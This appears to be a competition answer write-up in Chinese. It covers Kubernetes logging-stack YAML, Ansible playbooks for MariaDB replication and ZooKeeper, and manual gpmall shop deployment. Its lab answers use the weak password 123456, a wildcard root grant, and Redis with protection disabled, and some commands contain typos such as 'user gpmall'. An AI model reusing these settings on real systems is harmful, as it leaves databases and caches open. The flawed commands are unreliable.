volumeClaimTemplates:  - metadata:      name: es-pvc      labels:        app: elasticsearch    spec:      accessModes: [ &quot;ReadWriteMany&quot; ]      storageClassName: &quot;managed-nfs-storage&quot;      resources:        requests:          storage: 10Gi



8.创建 headless service编写 es-svc.yaml 文件，为 elasticsearch 的 pod 创建一个 headless service，并在 service
中声明 9200 和 9300 端口。
将 kubectl get svc 命令的返回结果提交到答题框。【2 分】
es-svc.yaml
[root@master nfs]# kubectl get svcNAME            TYPE        CLUSTER-IP   EXTERNAL-IP   PORT(S)             AGEelasticsearch   ClusterIP   None         &lt;none&gt;        9200/TCP,9300/TCP   17s

解法:
[root@master nfs]# cat es-svc.yamlkind: ServiceapiVersion: v1metadata:  name: elasticsearch  labels:    app: elasticsearchspec:  selector:    app: elasticsearch  clusterIP: None  ports:    - port: 9200      name: api    - port: 9300      name: int

9.Kibana 可视化 UI 界面部署编写 kibana.yaml，通过该文件创建 deployment 和 service，其中 deployment 基于
kibana:7.2.0 镜像创建并通过环境变量 ELASTICSEARCH_URL 指定 elasticsearch 服务地址；
service 代理 kibana 的 pod 服务，并且使用 NodePort 类型。创建成功后在浏览器访问 Kibana
的 UI 界面。
将 kubectl get svc 命令的返回结果提交到答题框。【2 分】
[root@master nfs]# kubectl get svcNAME            TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)             AGEelasticsearch   ClusterIP   None             &lt;none&gt;        9200/TCP,9300/TCP   12mkibana          NodePort    10.104.107.171   &lt;none&gt;        5601:30601/TCP      82skubernetes      ClusterIP   10.96.0.1        &lt;none&gt;        443/TCP             5d7h

解法:
[root@master nfs]# cat kibana.ymlapiVersion: apps/v1kind: Deploymentmetadata:  name: kibana  labels:    k8s-app: kibanaspec:  replicas: 1  selector:    matchLabels:      k8s-app: kibana  template:    metadata:      labels:        k8s-app: kibana    spec:      containers:      - name: kibana        image: kibana:7.2.0        resources:          limits:            cpu: 2            memory: 2Gi          requests:            cpu: 0.5            memory: 500Mi        env:          - name: ELASTICSEARCH_HOSTS            value: http://elasticsearch.default:9200          - name: ELASTICSEARCH_URL            value: http://elasticsearch.default:9200          - name: I18N_LOCALE            value: zh-CN        ports:        - containerPort: 5601          name: ui          protocol: TCP---apiVersion: v1kind: Servicemetadata:  name: kibanaspec:  type: NodePort  ports:  - port: 5601    protocol: TCP    targetPort: ui    nodePort: 30601  selector:    k8s-app: kibana

10.Fluentd 组件部署编写 fluentd.yaml，通过 yaml 文件创建 DaemonSet 控制器部署 fluentd 服务，并在该文
件中同时编写相关的 sa 账号和 rbac 内容，创建成功后保证可以正确采集容器内的日志。
将 kubectl get pods 命令的返回结果提交到答题框。【2 分】
C 模块题目：企业级应用的自动化部署和运维###环境192.168.157.20 ansible-control ansible192.168.157.21 ansible-compute1 host1192.168.157.22 ansible-compute2 host2192.168.157.23 ansible-compute3



任务 1 企业级应用的自动化部署（10 分）1.Ansible 自动化运维工具部署主从数据库（1）修改主机名 ansible 节点主机名为 ansible,host1 节点主机名为 host1,host2 节点主机名为
host2,请使用提供的软件包在 ansible 节点安装 ansible。
将 ansible –version 命令的返回结果提交到答题框。【1 分】
[root@ansible ~]#  ansible --versionansible 2.9.27  config file = /etc/ansible/ansible.cfg  configured module search path = [u&#x27;/root/.ansible/plugins/modules&#x27;, u&#x27;/usr/share/ansible/plugins/modules&#x27;]  ansible python module location = /usr/lib/python2.7/site-packages/ansible  executable location = /usr/bin/ansible  python version = 2.7.5 (default, Apr 11 2018, 07:36:10) [GCC 4.8.5 20150623 (Red Hat 4.8.5-28)]

解法:
#设置主机名(其他节点同理)hostnamectl set-hostname ansible#安装依赖[root@ansible ~]# yum install -y jinja2 PyYAML cryptography[root@ansible ~]# rpm -ivh ansible-2.4.6.0-1.el7.ans.noarch.rpm[root@ansible ~]# ansible --version

（2）配置主机清单文件，创建 mysql 主机组，mysql 主机组内添加 host1 和 host2 主机；创
建 mysql1 主机组，mysql1 组内添加 host1 主机；创建 mysql2 主机组，mysql2 组内添加 host2
主机，并配置免密登录。
将 ansible all -m ping 命令的返回结果提交到答题框。【1 分】
[root@ansible ~]# ansible all -m pinghost2 | SUCCESS =&gt; &#123;    &quot;ansible_facts&quot;: &#123;        &quot;discovered_interpreter_python&quot;: &quot;/usr/bin/python&quot;    &#125;,    &quot;changed&quot;: false,    &quot;ping&quot;: &quot;pong&quot;&#125;host1 | SUCCESS =&gt; &#123;    &quot;ansible_facts&quot;: &#123;        &quot;discovered_interpreter_python&quot;: &quot;/usr/bin/python&quot;    &#125;,    &quot;changed&quot;: false,    &quot;ping&quot;: &quot;pong&quot;&#125;

解法:
[[root@ansible ~]# cat /etc/ansible/hosts[mysql]host1host2[mysql1]host1[mysql2]host2##设置免密登录[root@ansible ~]# ssh-keygen[root@ansible ~]# ssh-copy-id test@192.168.157.20[root@ansible ~]# ssh-copy-id test@192.168.157.21[root@ansible ~]# ssh-copy-id test@192.168.157.22

（3）mysql 主机组内所有主机安装 mariadb 数据库，启动数据库并设置为开机自启动。
在 host1 节点将 systemctl status mariadb 命令的返回结果提交到答题框。【1 分】
[root@host1 ~]# systemctl status mariadb● mariadb.service - MariaDB database server   Loaded: loaded (/usr/lib/systemd/system/mariadb.service; enabled; vendor preset: disabled)   Active: active (running) since Thu 2023-03-16 01:04:32 EDT; 56min ago  Process: 992 ExecStartPost=/usr/libexec/mariadb-wait-ready $MAINPID (code=exited, status=0/SUCCESS)  Process: 897 ExecStartPre=/usr/libexec/mariadb-prepare-db-dir %n (code=exited, status=0/SUCCESS) Main PID: 990 (mysqld_safe)   CGroup: /system.slice/mariadb.service           ├─ 990 /bin/sh /usr/bin/mysqld_safe --basedir=/usr           └─1259 /usr/libexec/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib64/mysql/plugin --log-error=/var/log/mariadb/mariadb.log...Mar 16 01:04:30 ansible-compute1 systemd[1]: Starting MariaDB database server...Mar 16 01:04:30 ansible-compute1 mariadb-prepare-db-dir[897]: Database MariaDB is probably initialized in /var/lib/mysql already, nothing is done.Mar 16 01:04:30 ansible-compute1 mariadb-prepare-db-dir[897]: If this is not the case, make sure the /var/lib/mysql is empty before running mariadb-...db-dir.Mar 16 01:04:30 ansible-compute1 mysqld_safe[990]: 230316 01:04:30 mysqld_safe Logging to &#x27;/var/log/mariadb/mariadb.log&#x27;.Mar 16 01:04:30 ansible-compute1 mysqld_safe[990]: 230316 01:04:30 mysqld_safe Starting mysqld daemon with databases from /var/lib/mysqlMar 16 01:04:32 ansible-compute1 systemd[1]: Started MariaDB database server.Hint: Some lines were ellipsized, use -l to show in full.

解法:
[root@ansible ~]# cat mysql.yaml---- name: install mariadb  hosts: mysql  tasks:  - name: install mariadb    yum: name=mariadb-server state=present  - name: start mariadb    service: name=mariadb state=started enabled=yes[root@ansible ~]# ansible-playbook  mysql.yaml

（4）编写一名称为 mariadb.sh 的 shell 脚本，该脚本具有完成 mariadb 数据库的初始化功能
(要求数据库用户名为 root,密码为 123456)，通过 ansible 对应模块执行 mariadb.sh 完成对
mysql 主机组下的所有节点进行数据库初始化。
在 node1 节点，将 mysql -uroot -p123456 命令的返回结果提交到答题框。【1 分】
[root@host1 ~]#  mysql -uroot -p123456Welcome to the MariaDB monitor.  Commands end with ; or \g.Your MariaDB connection id is 3Server version: 5.5.68-MariaDB MariaDB ServerCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.MariaDB [(none)]&gt;

解法:
[root@ansible ~]# cat mariadb.sh#!/bin/bashmysqladmin -u root password &quot;123456&quot;[root@ansible ~]# cat mysql-sh.yaml---- name: init mariadb  hosts: mysql  tasks:    - name: init mariadb      script: /root/mariadb.sh

（5）创建主机变量，所有主机组中 host1 节点创建变量 id&#x3D;20,hots2 节点创建变量 id&#x3D;30。
将 cat &#x2F;etc&#x2F;ansible&#x2F;hosts | grep id 命令的返回结果提交到答题框。【1 分】
[root@ansible ~]#  cat /etc/ansible/hosts | grep idid=20id=30

解法:
[root@ansible ~]# cat /etc/ansible/hosts[mysql]host1host2[mysql1]host1[mysql2]host2[mysql1:vars]id=20[mysql2:vars]id=30

（6）根据 mysql 配置文件创建 mysql 的 Janja2 模板文件命名为 my.cnf.j2,编写 mariadb.yaml
文件实现主从数据库的配置和权限设置。
在 ansible 节点通过 cat mariadb.yaml 命令查看文件内容返回结果提交到答题框，在 host2
节点进入数据库将 show slave status \G 命令的返回结果提交到答题框。【1 分】
MariaDB [(none)]&gt; show slave status \G;*************************** 1. row ***************************               Slave_IO_State: Waiting for master to send event                  Master_Host: 192.168.157.21                  Master_User: user                  Master_Port: 3306                Connect_Retry: 60              Master_Log_File: mysql-bin.000001          Read_Master_Log_Pos: 524               Relay_Log_File: ansible-compute2-relay-bin.000002                Relay_Log_Pos: 808        Relay_Master_Log_File: mysql-bin.000001             Slave_IO_Running: Yes            Slave_SQL_Running: Yes              Replicate_Do_DB:          Replicate_Ignore_DB:           Replicate_Do_Table:       Replicate_Ignore_Table:      Replicate_Wild_Do_Table:  Replicate_Wild_Ignore_Table:                   Last_Errno: 0                   Last_Error:                 Skip_Counter: 0          Exec_Master_Log_Pos: 524              Relay_Log_Space: 1113              Until_Condition: None               Until_Log_File:                Until_Log_Pos: 0           Master_SSL_Allowed: No           Master_SSL_CA_File:           Master_SSL_CA_Path:              Master_SSL_Cert:            Master_SSL_Cipher:               Master_SSL_Key:        Seconds_Behind_Master: 0Master_SSL_Verify_Server_Cert: No                Last_IO_Errno: 0                Last_IO_Error:               Last_SQL_Errno: 0               Last_SQL_Error:  Replicate_Ignore_Server_Ids:             Master_Server_Id: 201 row in set (0.00 sec)

解法:
cat my.cnf.j2[mysqld]log_bin=mysql-binserver_id=&#123;&#123; id &#125;&#125;[root@ansible ~]# cat mariadb.yaml---- name: config mariadb  hosts: mysql1,mysql2  tasks:  - name: config my.cnf    template: src=my.cnf.j2 dest=/etc/my.cnf  - name: restart mariadb    service: name=mariadb state=restarted enabled=yes  - name: grant user    shell: mysql -uroot -p123456 -e &quot;grant all privileges on *.* to root@&#x27;%&#x27; identified by &#x27;123456&#x27;;&quot;    when: inventory_hostname in groups.mysql1  - name: master create user    shell: mysql -uroot -p123456 -e &quot;grant replication slave on *.* to &#x27;user&#x27;@&#x27;%&#x27; identified by &#x27;123456&#x27;;&quot;    when: inventory_hostname in groups.mysql1  - name: node    shell: mysql -uroot -p123456 -e &quot;change master to master_host=&#x27;192.168.157.21&#x27;,master_user=&#x27;user&#x27;,master_password=&#x27;123456&#x27;;&quot;    when: inventory_hostname in groups.mysql2  - name: start slave    shell: mysql -uroot -p123456 -e &quot;start slave;&quot;    when: inventory_hostname in groups.mysql2



2.Ansible 自动化运维工具部署 zookeeper 集群zookeeper 是一个分布式服务框架，是 Apache Hadoop 的一个子项目，主要是用来解决
分布式应用中经常遇到的一些数据管理问题，如：统一命名服务、状态同步服务、集群管理、
分布式应用配置项的管理等。gpmall 商城系统中用到了 kafka 消息队列，kafka 集群的搭建
依赖 zookeeper 集群来进行元数据的管理。
（1）编写主机清单文件，创建 zookeeper 主机组，zookeeper 主机组内添加 ansible、host1
和 host2 主机，分别创建主机变量 zk_id&#x3D;私有 IP 最后一个数字。
将 ansible all -a “id”命令的返回结果提交到答题框。【2 分】
root@ansible ~]# ansible all -a &quot;id&quot;ansible | CHANGED | rc=0 &gt;&gt;uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023host1 | CHANGED | rc=0 &gt;&gt;uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023host2 | CHANGED | rc=0 &gt;&gt;uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023

解法:
[root@ansible ~]# cat /etc/ansible/hosts[zookeeper]ansible zk_id=1host1 zk_id=2host2 zk_id=3

（2）在 ansible 节点，使用提供的 zookeeper-3.4.14.tar.gz 软件包，编写 zookeeper.yaml 文件,
实现 zookeeper 集群搭建，创建任务清单实现 zookeeper 安装包批量解压、通过 Janja2 模板
文件配置 zookeeper、创建 zookeeper 的 myid 文件和批量启动 zookeeper 功能。在三个节点
相应的目录使用.&#x2F;zkServer.sh status 命令查看三个 Zookeeper 节点的状态。
在 ansible 主机上将 cat zookeeper.yaml 命令结果提交到答题框，将 jps 命令的返回结果
提交到答题框。【2 分】
[root@ansible zookeeper]# jps7620 Jps7574 QuorumPeerMain[root@ansible zookeeper]# cat zookeeper.yaml---- hosts: zookeeper  tasks:  - name: install inneed    yum: name=java-1.8.0-openjdk* state=present  - name: tar zookeeper    copy: src=/root/zookeeper-3.4.14.tar.gz dest=/opt/  - name: tar zookeeper    shell: tar zxvf /opt/zookeeper-3.4.14.tar.gz -C /opt  - name: copy    copy: src=zoo.cfg dest=/opt/zookeeper-3.4.14/conf/  - name: create file    file: path=/tmp/zookeeper state=directory  - name: copy j2id    template: src=myid.j2 dest=/tmp/zookeeper/myid  - name: start zk    shell: &quot;/opt/zookeeper-3.4.14/bin/zkServer.sh start&quot;

解法:
[root@ansible zookeeper]# cat zoo.cfgtickTime=2000initLimit=10syncLimit=5dataDir=/tmp/zookeeperclientPort=2181server.1=ansible:2888:3888server.2=host1:2888:3888server.3=host2:2888:3888[root@ansible zookeeper]# cat myid.j2&#123;&#123;  zk_id &#125;&#125;

任务 2 应用商城系统部署【10 分】
1.在 ansible 节点，使用提供的 gpmall-cluster 软件包，完成集群应用系统部署。部署完成后，
进行登录，最后使用 curl 命令去获取商城首页的返回信息，
先将 netstat –ntpl 命令的返回结果提交到答题框，然后将 curl -l http://EIP:80 命令的返回
结果提交到答题框。【10 分】

#在controller节点进行操作将文件包进行上传,目前已完成mariadb,zookeeper部署[root@ansible ~]# cat /etc/hosts127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4::1         localhost localhost.localdomain localhost6 localhost6.localdomain6192.168.157.20 ansible-control ansible192.168.157.21 ansible-compute1 host1192.168.157.22 ansible-compute2 host2192.168.157.23 ansible-compute3127.0.0.1 mysql.mall127.0.0.1 redis.mall127.0.0.1 zk1.mall127.0.0.1 kafka1.mall##配置kafkacd kafka_2.11-1.1.1[root@ansible ~]# cd kafka_2.11-1.1.1[root@ansible kafka_2.11-1.1.1]# lsbin  config  libs  LICENSE  NOTICE  site-docs[root@ansible kafka_2.11-1.1.1]# cd bin/[root@ansible bin]# ./kafka-server-start.sh ../config/server.properties#配置redis# yum install -y redis # sed -i &#x27;s/bind 127.0.0.1/#bind 127.0.0.1/g&#x27; /etc/redis.conf# sed -i &#x27;s/protected-mode yes/protected-mode no/g&#x27; /etc/redis.conf# redis-server etc/redis.conf#配置mariadbmysql -u root -p123456 -e &quot;grant all on *.* to &#x27;root&#x27;@&#x27;% identified by &#x27;123456&#x27;;&quot;mysql -u root -p123456 -e &#x27;create database gpmall default character set=utf8;&#x27;mysql -u root -p123456 -e &quot;user gpmall;source/root/gpmall.sql&quot;  ##修改端口[root@ansible bin]# cat /etc/my.cnf[mysqld]port=8066#配置nginx#  vi /etc/nginx/conf.d/default.confserver &#123;    listen       80;    server_name  localhost;    #charset koi8-r;    #access_log  /var/log/nginx/host.access.log  main;    location / &#123;        root   /usr/share/nginx/html;        index  index.html index.htm;    &#125;    location /user &#123;        proxy_pass http://127.0.0.1:8082;    &#125;    location /shopping &#123;        proxy_pass http://127.0.0.1:8081;    &#125;    location /cashier &#123;        proxy_pass http://127.0.0.1:8083;    &#125;    #error_page  404              /404.html;    # redirect server error pages to the static page /50x.html    #    error_page   500 502 503 504  /50x.html;    location = /50x.html &#123;        root   /usr/share/nginx/html;    &#125;    # proxy the PHP scripts to Apache listening on 127.0.0.1:80    #    #location ~ \.php$ &#123;    #    proxy_pass   http://127.0.0.1;    #&#125;    # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000    #    #location ~ \.php$ &#123;    #    root           html;    #    fastcgi_pass   127.0.0.1:9000;    #    fastcgi_index  index.php;    #    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;    #    include        fastcgi_params;    #&#125;    # deny access to .htaccess files, if Apache&#x27;s document root    # concurs with nginx&#x27;s one    #    #location ~ /\.ht &#123;    #    deny  all;    #&#125;&#125;systemctl enable nginx# rm -rf /usr/share/nginx/html/*# cp -rvf dist/* /usr/share/nginx/html/#启动jar包nohup java -jar user-provider-0.0.1-SNAPSHOT.jar &amp;nohup java -jar shopping-provider-0.0.1-SNAPSHOT.jar &amp;nohup java -jar gpmall-shopping-0.0.1-SNAPSHOT.jar &amp;nohup java -jar gpmall-user-0.0.1-SNAPSHOT.jar &amp;

]]></content>
      <categories>
        <category>云计算</category>
        <category>技能大赛汇总</category>
      </categories>
      <tags>
        <tag>云计算</tag>
        <tag>云计算职业技能大赛</tag>
      </tags>
  </entry>
</search>
